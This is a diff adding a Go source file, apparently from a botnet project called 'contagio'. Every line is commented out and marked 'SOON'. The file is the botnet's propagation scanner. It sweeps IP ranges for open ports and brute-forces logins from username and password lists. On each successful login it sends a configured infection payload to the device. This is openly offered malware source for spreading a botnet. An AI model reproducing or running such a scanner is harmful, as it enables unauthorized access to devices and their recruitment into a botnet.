@@ -1,0 +1,131 @@
+// SOON
+
+// package main
+
+// import (
+// 	"contagio/bot/config"
+// 	"contagio/bot/utils"
+// 	"context"
+// 	"fmt"
+// 	"net"
+// 	"strconv"
+// 	"strings"
+// 	"syscall"
+// 	"time"
+// )
+
+// var validIps []string
+
+// func StartScanner() {
+// 	for {
+// 		Range()
+// 		fmt.Println(validIps)
+// 		for _, j := range validIps {
+
+// 			for _, i := range utils.LoginList {
+// 				for _, x := range utils.PasswrdList {
+// 					go scan(j, i, x)
+// 					time.Sleep(10 * time.Millisecond)
+// 				}
+// 			}
+// 		}
+// 		time.Sleep(5 * time.Second)
+// 	}
+// 	// }
+// }
+
+// func Range() {
+
+// 	var ips []string
+// 	startIP := net.ParseIP(utils.GetArrayVal(utils.Networks))
+// 	endIP := net.ParseIP(startIP.String()[:len(startIP.String())-4] + ".255.255")
+
+// 	for ip := startIP; ip.String() <= endIP.String(); inc(ip) {
+// 		for _, port := range utils.NetworkPorts {
+// 			ips = append(ips, ip.String()+":"+port)
+// 		}
+// 	}
+
+// 	for _, i := range ips {
+// 		go func() {
+// 			tryToConnect(i)
+// 		}()
+
+// 		time.Sleep(150 * time.Millisecond)
+
+// 	}
+// 	time.Sleep(5 * time.Second)
+
+// }
+
+// func tryToConnect(targ string) error {
+
+// 	_, err := net.DialTimeout("tcp", targ, 2*time.Second)
+// 	if err != nil {
+// 		// fmt.Println(err)
+// 		return err
+// 	}
+// 	validIps = append(validIps, targ)
+
+// 	return nil
+// }
+// func inc(ip net.IP) {
+// 	for j := len(ip) - 1; j >= 0; j-- {
+// 		ip[j]++
+// 		if ip[j] > 0 {
+// 			break
+// 		}
+// 	}
+// }
+
+// func scan(targ, login, pass string) {
+// 	fmt.Println(targ, login, pass)
+// 	server := strings.Split(targ, ":")
+
+// 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
+// 	if err != nil {
+// 		return
+// 	}
+
+// 	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
+// 	defer cancel()
+
+// 	port, err := strconv.Atoi(server[1])
+// 	var addr syscall.SockaddrInet4
+// 	addr.Port = port
+// 	copy(addr.Addr[:], net.ParseIP(server[0]).To4())
+
+// 	connected := make(chan bool)
+
+// 	go func() {
+// 		defer func() {
+// 			if err := recover(); err != nil {
+// 				return
+// 			}
+// 		}()
+// 		err = syscall.Connect(fd, &addr)
+// 		if err != nil {
+// 			return
+// 		}
+// 		connected <- true
+// 	}()
+
+// 	select {
+// 	case <-ctx.Done(): // timeout
+// 		return
+// 	case <-connected: // ok
+// 		break
+// 	}
+
+// 	syscall.SetNonblock(fd, true)
+
+// 	// auth
+// 	time.Sleep(400 * time.Millisecond)
+// 	syscall.Sendto(fd, []byte(login+"\r\n"), 0, &addr)
+// 	time.Sleep(400 * time.Millisecond)
+// 	syscall.Sendto(fd, []byte(pass+"\r\n"), 0, &addr)
+// 	time.Sleep(400 * time.Millisecond)
+
+// 	syscall.Sendto(fd, []byte(config.SCANNER_PAYLOAD+"\r\n"), 0, &addr)
+
+// }
